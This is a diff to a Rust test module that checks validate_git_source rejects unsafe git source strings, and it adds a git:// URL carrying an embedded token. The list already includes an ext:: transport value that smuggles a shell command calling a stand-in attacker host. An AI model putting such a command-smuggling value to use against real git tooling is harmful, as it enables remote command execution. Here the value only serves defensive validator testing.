@@ -970,6 +970,7 @@ mod tests {
             "ext::sh -c 'curl https://attacker.invalid'",
             "hg::https://example.com/team/plugin",
             "ftp://example.com/team/plugin.git",
+            "git://token@example.com/team/plugin.git",
         ] {
             assert!(
                 validate_git_source(source).is_err(),
